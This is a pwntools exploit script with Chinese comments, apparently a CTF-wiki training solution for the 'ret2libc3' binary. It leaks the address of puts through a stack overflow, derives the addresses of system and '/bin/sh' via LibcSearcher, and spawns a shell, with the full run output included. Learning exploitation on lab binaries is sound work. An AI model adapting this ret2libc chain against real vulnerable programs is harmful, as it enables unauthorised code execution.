# 导入 pwntools 库，这是一个用于二进制漏洞利用的强大工具库。
from pwn import *
# 导入 LibcSearcher，这是一个用于从函数地址中搜索libc版本和提取libc函数地址的工具。
from LibcSearcher import * 

# 创建一个新的进程，执行名为 ret2libc3 的可执行文件。这将用于在本地系统上执行漏洞利用。
io = process("./ret2libc3")
# 将 ret2libc3 可执行文件加载到 elf 对象中，以便从中获取有关程序结构的信息，例如函数地址和GOT地址。
elf = ELF("./ret2libc3")

print("=== 通过泄露 puts 函数的地址 ===")
# 获取 puts 函数的 PLT（Procedure Linkage Table）地址和 GOT（Global Offset Table）地址。
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
# 获取程序的 _start 符号的地址，这通常是程序的入口点。
start_addr=elf.symbols['_start']
print("puts_plt: ", puts_plt)
print("hex(puts_plt): ", hex(puts_plt))
print("puts_got: ", puts_got)
print("hex(puts_got): ", hex(puts_got))
print("start_addr: ", start_addr)
print("hex(start_addr): ", hex(start_addr))
# 构建一个 payload，其中包括 112 个字节的填充（用于填充到返回地址之前），然后是 puts 函数的 PLT 地址、程序入口点地址和 puts 函数的 GOT 地址。这将在程序中触发漏洞。
payload1 = flat([b'A'*112,puts_plt,start_addr,puts_got])
# payload1 = b'A'*108 + b'BBBB' + puts_plt + start + puts_got  # 报错：TypeError: can't concat int to bytes
# payload1 = b'A'*108 + b'BBBB' + p32(puts_plt) + p32(start) + p32(puts_got) # 正确写法
print("payload1: ", payload1)
# 发送构建好的 payload1 到程序。
io.sendlineafter('!?',payload1)
# 接收从程序中泄露的 puts 函数的地址，并将其转换为整数。这将帮助确定libc的基址。
# io.recv(4)接受程序返回的二进制 大小为4字节  u32()为保存为无符号的32位
puts_addr_raw = io.recv(4)
puts_addr = u32(puts_addr_raw) 
print("puts_addr_raw: ", puts_addr_raw)
print("puts_addr: ", puts_addr)
print("hex(puts_addr): ", hex(puts_addr))

print("=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ===")
# 使用 LibcSearcher 工具，根据泄露的 puts 函数地址来搜索libc库并提取相关信息。
libc = LibcSearcher('puts',puts_addr)
# 计算libc的基址，这是通过从 puts 函数地址中减去 puts 在libc中的偏移得到的。
base = puts_addr-libc.dump('puts')
# 计算 system 函数和 /bin/sh 字符串的地址，这将用于后续的漏洞利用。
system_addr = base+libc.dump('system')
bin_addr=base+libc.dump('str_bin_sh')
# 构建第二个 payload，其中包括 112 个字节的填充，然后是计算得到的 system 函数地址、随意的返回地址（1234），以及计算得到的 /bin/sh 字符串地址。
print("hex(base): ", hex(base))
print("hex(system_addr): ", hex(system_addr))
print("hex(bin_addr): ", hex(bin_addr))
payload2 = flat([b'A'*112,system_addr,1234,bin_addr])
# 使用p32函数将整数转换为对应的4字节二进制字符串
# payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'0xdeadbeaf' + p32(sh_addr) # 错误写法
# payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # 正确写法
# payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'\x0f\x0b\x0f\x0b' + p32(sh_addr) # 正确写法
# payload2 = b'A'*108 + b'BBBB' + p32(system_addr) + b'1234' + p32(sh_addr) # 正确写法
print("payload2: ", payload2)
# 发送构建好的 payload2 到程序，触发第二阶段的漏洞利用，旨在获取系统 Shell。
io.sendlineafter('!?',payload2)
# 与程序进行交互，获取系统 Shell，进入交互式命令模式。
io.interactive()

"""                                                            
┌──(root㉿kali)-[~/ctfwiki/ret2libc3]
└─# python exp.py      
[+] Starting local process './ret2libc3': pid 18449
[*] '/root/ctfwiki/ret2libc3/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
=== 通过泄露 puts 函数的地址 ===
puts_plt:  134513760
hex(puts_plt):  0x8048460
puts_got:  134520856
hex(puts_got):  0x804a018
start_addr:  134513872
hex(start_addr):  0x80484d0
payload1:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`\x84\x04\x08\xd0\x84\x04\x08\x18\xa0\x04\x08'
/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
puts_addr_raw:  b' 2\xc7\xf7'
puts_addr:  4157026848
hex(puts_addr):  0xf7c73220
=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ===
[+] There are multiple libc that meet current constraints :
0 - libc6_2.37-5_i386
1 - libc6_2.32-0experimental0_amd64
2 - libc6_2.37-6_i386
3 - libc6-amd64_2.32-0experimental0_i386
4 - libc6-amd64_2.8~20080505-0ubuntu9_i386
5 - libc6_2.32-0experimental1_amd64
6 - libc6-amd64_2.32-0experimental1_i386
7 - libc6_2.8~20080505-0ubuntu9_amd64
8 - libc6_2.37-7_i386
[+] Choose one : 0
hex(base):  0xf7c00000
hex(system_addr):  0xf7c4c8a0
hex(bin_addr):  0xf7db5fc8
payload2:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xc8\xc4\xf7\xd2\x04\x00\x00\xc8_\xdb\xf7'
[*] Switching to interactive mode
$ ls
core  exp2.py  exp-clean.py  exp.py  ret2libc3
$  
"""